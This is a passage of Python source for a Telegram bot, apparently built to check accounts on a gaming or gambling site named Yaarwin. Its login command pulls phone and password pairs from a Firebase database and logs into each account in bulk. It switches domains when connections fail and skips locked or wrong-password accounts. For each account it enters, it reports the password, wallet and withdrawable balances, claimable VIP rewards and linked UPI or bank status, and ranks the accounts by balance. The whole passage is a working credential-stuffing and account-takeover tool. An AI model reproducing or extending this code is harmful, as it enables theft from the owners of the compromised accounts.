        return False

    await send_success_list(update, success_list, title, has_vip_rewards)


async def nobalance_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    if context.args and context.args[0].lower() == "today":
        success_list = get_user_success_by_date(user_id, "today")
        title = "❌ TODAY ZERO BALANCE"
    else:
        success_list = get_user_success(user_id)
        title = "❌ ZERO BALANCE"

    def no_balance(s):
        bal = parse_balance(s.get("balance", "₹0"))
        return bal == 0

    await send_success_list(update, success_list, title, no_balance)


async def clearsuccess_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    clear_user_success(user_id)
    await update.message.reply_text("🗑️ Cleared!")


async def login_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global STOP_NOW, DOMAIN_INDEX
    STOP_NOW = False

    user_id = update.effective_user.id
    user_data = get_user_data(user_id)
    firebase_url = user_data.get("firebase_url")
    skip_count = user_data.get("skip_count", 0)

    if not firebase_url:
        await update.message.reply_text("❌ Set Firebase URL first!\n/setfirebase <url>")
        return

    await update.message.reply_text("🔄 Fetching data...")

    data = fetch_firebase(firebase_url)
    if not data:
        await update.message.reply_text("❌ Failed to fetch data! Check URL.")
        return

    users = []
    if isinstance(data, dict):
        for key, value in data.items():
            if isinstance(value, dict):
                phone = value.get("phone") or value.get("number") or key
                pwd = value.get("password") or value.get("pass")
                if phone and pwd:
                    users.append({"phone": str(phone), "password": str(pwd)})

    if not users:
        await update.message.reply_text("⚠️ No credentials found!")
        return

    total = len(users)
    if skip_count >= total:
        await update.message.reply_text("⚠️ Skip >= Total!")
        return

    to_process = users[skip_count:]
    process_count = len(to_process)

    working = find_working_domain()

    await update.message.reply_text(
        "🌐 Working Domain: " + working + "\n"
        "🔄 Auto-switch: ON\n\n"
        "📋 Total IDs: " + str(total) + "\n"
        "⏭️ Skip: " + str(skip_count) + "\n"
        "🎯 Process: " + str(process_count) + "\n\n"
        "⚡ NO TIMEOUT MODE\n"
        "🔄 Retry until success\n"
        "⏭️ Wrong pass/Locked = Skip\n"
        "🧹 Chrome cleanup every 10 IDs\n"
        "🎁 VIP: Current + Next level + Real bet\n"
        "🛑 /stop to STOP"
    )

    success_list = []
    failed_list = []
    skipped_list = []
    retry_count = 0
    processed_count = 0
    domain_switches = 0

    for idx, user in enumerate(to_process):
        if STOP_NOW:
            await update.message.reply_text("🛑 STOPPED by user!")
            break

        if idx > 0 and idx % 10 == 0:
            try:
                await update.message.reply_text("🧹 Chrome cleanup after " + str(idx) + " IDs...")
            except:
                pass
            gc.collect()
            time.sleep(2)
            try:
                await update.message.reply_text("✅ Cleanup done! Continuing...")
            except:
                pass

        actual = skip_count + idx + 1
        batch_num = idx + 1
        phone = user["phone"]
        password = user["password"]

        try:
            current_dom = get_current_domain()
            await update.message.reply_text(
                "🔄 [" + str(batch_num) + "/" + str(process_count) + "] | Total: [" + str(actual) + "/" + str(total) + "]\n"
                "🌐 Domain: " + current_dom + "\n"
                "📱 Phone: " + phone + "\n"
                "⏳ Starting login..."
            )
        except:
            pass

        start_time = time.time()
        attempt = 1
        max_attempts = 2
        result = None
        is_retry = False
        switched_in_session = False

        while attempt <= max_attempts:
            if STOP_NOW:
                break

            bot = GameBot(phone, password)
            try:
                if not bot.setup():
                    result = {"type": "failed", "phone": phone, "reason": bot.reason}
                else:
                    if bot.fast_login():
                        bot.get_all_details_real()
                        result = {
                            "type": "success",
                            "phone": phone,
                            "password": password,
                            "balance": bot.wallet,
                            "withdrawable": bot.withdrawable,
                            "vip_level": bot.vip_level,
                            "vip_status": bot.vip_status,
                            "vip_bet_progress": bot.vip_bet_progress,
                            "vip_level_up_rewards": bot.vip_level_up_rewards,
                            "total_exp": bot.total_exp,
                            "payout_days": bot.payout_days,
                            "first_deposit": bot.first_deposit,
                            "upi": bot.upi_status,
                            "bank": bot.bank_status,
                            "arwallet": bot.arwallet,
                            "safe": bot.safe_balance,
                            "domain": bot.current_domain
                        }
                        if bot.domain_switched:
                            switched_in_session = True
                            domain_switches += 1
                    else:
                        result = {"type": "failed", "phone": phone, "reason": bot.reason}
                        if bot.domain_switched:
                            switched_in_session = True
                            domain_switches += 1
                bot.close()
            except Exception as e:
                try:
                    bot.close()
                except:
                    pass
                result = {"type": "failed", "phone": phone, "reason": "Crash: " + str(e)[:60]}

            if result["type"] == "failed":
                reason = result.get("reason", "")

                if "SKIP" in reason or "locked" in reason.lower() or "wrong" in reason.lower() or "disabled" in reason.lower():
                    result["skip"] = True
                    break

                if ("Page not loaded" in reason or "Page load" in reason or "timeout" in reason.lower() or 
                    "net::" in reason or "err_" in reason.lower() or "connection" in reason.lower() or
                    "network" in reason.lower() or "dns" in reason.lower() or "session not created" in reason.lower() or
                    "All domains failed" in reason):
                    if attempt < max_attempts:
                        attempt += 1
                        is_retry = True
                        retry_count += 1

                        new_domain = switch_domain()
                        domain_switches += 1
                        switched_in_session = True

                        try:
                            await update.message.reply_text(
                                "🔄 [" + str(batch_num) + "/" + str(process_count) + "] | Total: [" + str(actual) + "/" + str(total) + "]\n"
                                "📱 " + phone + "\n"
                                "⚠️ " + reason + "\n"
                                "🌐 Switched to: " + new_domain + "\n"
                                "🔁 Retrying (Attempt " + str(attempt) + "/" + str(max_attempts) + ")..."
                            )
                        except:
                            pass
                        time.sleep(2)
                        continue

                break
            else:
                break

        elapsed = time.time() - start_time
        processed_count += 1

        if result["type"] == "success":
            add_success(user_id, result)
            success_list.append(result)

            vip_summary = ""
            if result.get("vip_level_up_rewards"):
                for reward in result["vip_level_up_rewards"]:
                    r_type = reward.get("type", "Level Up")
                    amt = reward.get("amount", "0")
                    status = reward.get("status", "Unknown")
                    if status == "Receive":
                        vip_summary += "\n   🟢 " + r_type + ": ₹" + amt + " | Receive (GREEN)"
                    elif status == "Received":
                        vip_summary += "\n   ⬜ " + r_type + ": ₹" + amt + " | Received (Done)"
                    else:
                        vip_summary += "\n   ❓ " + r_type + ": ₹" + amt + " | " + status
            else:
                vip_summary = "\n   ❌ No VIP rewards"

            retry_msg = "\n   🔁 Retried: Yes" if is_retry else ""
            domain_msg = "\n   🌐 Domain: " + result.get("domain", get_current_domain()) if result.get("domain") else ""
            switch_msg = "\n   🔄 Domain Switched: Yes" if switched_in_session else ""

            msg = (
                "✅ [" + str(batch_num) + "/" + str(process_count) + "] | Total: [" + str(actual) + "/" + str(total) + "]\n"
                "═══════════════════════════════════\n"
                "✅     L O G I N   S U C C E S S     ✅\n"
                "⏱️ " + str(round(elapsed, 1)) + " sec" + retry_msg + domain_msg + switch_msg + "\n"
                "═══════════════════════════════════\n\n"
                "📱 Phone: " + result["phone"] + "\n"
                "🔑 Pass:  " + result["password"] + "\n\n"
            )

            msg += (
                "💰 BALANCE:\n"
                "   Total: " + result["balance"] + "\n"
            )
            if result.get("withdrawable") and result["withdrawable"] != "N/A":
                msg += "   Withdrawable: " + result["withdrawable"] + "\n"
            if result.get("safe") and result["safe"] != "N/A":
                msg += "   Safe: " + result["safe"] + "\n"
            if result.get("arwallet") and result["arwallet"] != "N/A":
                msg += "   ARWallet: " + result["arwallet"] + "\n"
            msg += "\n"

            if result.get("vip_status"):
                msg += "👑 VIP STATUS:\n   " + result["vip_status"] + "\n"
            else:
                msg += (
                    "👑 VIP:\n"
                    "   Level: VIP " + result["vip_level"] + "\n"
                )
                if result.get("vip_bet_progress"):
                    msg += "   Bet: " + result["vip_bet_progress"] + "\n"

            if result.get("total_exp") and result["total_exp"] != "0":
                msg += "\n   📊 Total EXP: " + result["total_exp"] + "\n"
            if result.get("payout_days") and result["payout_days"] != "0":
                msg += "   📅 Payout: " + result["payout_days"] + " Days\n"

            msg += "\n   🎁 VIP REWARDS:" + vip_summary + "\n\n"

            if result["first_deposit"]:
                msg += "🎉 FIRST DEPOSIT (CLAIM AVAILABLE):\n"
                for dep in result["first_deposit"]:
                    msg += "   " + dep + "\n"
                msg += "\n"
            else:
                msg += "🎉 FIRST DEPOSIT: None available\n\n"

            msg += (
                "💳 PAYMENT:\n"
                "   UPI:  " + result["upi"] + "\n"
                "   Bank: " + result["bank"] + "\n\n"
                "═══════════════════════════════════"
            )

            try:
                await update.message.reply_text(msg)
            except Exception as e:
                logger.error("Send success error: " + str(e))
                pass

        elif result["type"] == "failed":
            failed_list.append(result)
            reason = result.get("reason", "Failed")

            if result.get("skip") or "SKIP" in reason or "locked" in reason.lower() or "wrong" in reason.lower():
                skipped_list.append(result)
                try:
                    await update.message.reply_text(
                        "⏭️ [" + str(batch_num) + "/" + str(process_count) + "] | Total: [" + str(actual) + "/" + str(total) + "]\n"
                        "📱 " + phone + "\n"
                        "❌ " + reason + "\n"
                        "⏱️ " + str(round(elapsed, 1)) + " sec → SKIPPED (Wrong Pass/Locked)"
                    )
                except:
                    pass
            else:
                try:
                    retry_info = "\n   🔁 Retried: Yes (until success)" if is_retry else ""
                    switch_info = "\n   🔄 Domain Switched: Yes" if switched_in_session else ""
                    await update.message.reply_text(
                        "❌ [" + str(batch_num) + "/" + str(process_count) + "] | Total: [" + str(actual) + "/" + str(total) + "]\n"
                        "📱 " + phone + "\n"
                        "❌ " + reason + "\n"
                        "⏱️ " + str(round(elapsed, 1)) + " sec" + retry_info + switch_info + "\n"
                        "   (Will retry in next /login run)"
                    )
                except:
                    pass

        if processed_count % 5 == 0 or idx == len(to_process) - 1:
            try:
                summary_msg = (
                    "📊 RUNNING SUMMARY\n"
                    "═══════════════════════\n"
                    "🌐 Current Domain: " + get_current_domain() + "\n"
                    "✅ Processed: " + str(processed_count) + "/" + str(process_count) + "\n"
                    "🎯 Success: " + str(len(success_list)) + "\n"
                    "❌ Failed (Will retry next run): " + str(len(failed_list)) + "\n"
                    "⏭️ Skipped (Wrong Pass/Locked): " + str(len(skipped_list)) + "\n"
                    "🔄 Total Retries: " + str(retry_count) + "\n"
                    "🌐 Domain Switches: " + str(domain_switches) + "\n"
                    "═══════════════════════"
                )
                await update.message.reply_text(summary_msg)
            except:
                pass

        gc.collect()

    report = (
        "╔═══════════════════════════════════╗\n"
        "║      F I N A L   R E P O R T      ║\n"
        "╚═══════════════════════════════════╝\n\n"
        "🌐 Final Domain: " + get_current_domain() + "\n"
        "📊 Total IDs: " + str(total) + "\n"
        "⏭️ Skip Setting: " + str(skip_count) + "\n"
        "🎯 Processed: " + str(processed_count) + "\n"
        "✅ Success: " + str(len(success_list)) + "\n"
        "❌ Failed (Will retry next run): " + str(len(failed_list)) + "\n"
        "⏭️ Skipped (Wrong Pass/Locked): " + str(len(skipped_list)) + "\n"
        "🔄 Total Retries: " + str(retry_count) + "\n"
        "🌐 Domain Switches: " + str(domain_switches) + "\n\n"
    )

    if success_list:
        sorted_success = sort_by_balance(success_list)
        report += "💰 TOP BALANCES:\n"
        for i, s in enumerate(sorted_success[:10]):
            report += str(i+1) + ". " + s["phone"] + " → " + s["balance"] + "\n"

        vip_reward_count = 0
        for s in success_list:
            if s.get("vip_level_up_rewards"):
                for reward in s["vip_level_up_rewards"]:
                    if reward.get("status") == "Receive":
                        vip_reward_count += 1

        if vip_reward_count > 0:
            report += "\n🎁 Total VIP Receive Rewards: " + str(vip_reward_count) + "\n"

    if failed_list:
        report += "\n❌ Failed: " + str(len(failed_list))

    report += "\n\n📊 /balance /firstdeposit /vip /nobalance"

    await update.message.reply_text(report)


async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if update and update.effective_message:
            await update.message.reply_text("❌ Error: " + str(context.error)[:100])
    except:
        pass


def main():
    print("🚀 Starting Yaarwin Bot - ULTIMATE v26...")
    working = find_working_domain()
    print("   ✅ Working domain: " + working)

    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start_cmd))
    app.add_handler(CommandHandler("setfirebase", setfirebase_cmd))
    app.add_handler(CommandHandler("setskip", setskip_cmd))
    app.add_handler(CommandHandler("login", login_cmd))
    app.add_handler(CommandHandler("stop", stop_cmd))
    app.add_handler(CommandHandler("status", status_cmd))
    app.add_handler(CommandHandler(("success"), success_cmd))
    app.add_handler(CommandHandler("balance", balance_cmd))
    app.add_handler(CommandHandler("firstdeposit", firstdeposit_cmd))
    app.add_handler(CommandHandler("vip", vip_cmd))
    app.add_handler(CommandHandler("nobalance", nobalance_cmd))
    app.add_handler(CommandHandler("clearsuccess", clearsuccess_cmd))
    app.add_error_handler(error_handler)

    print("✅ Ready! Use /start for commands.")
    app.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    main()
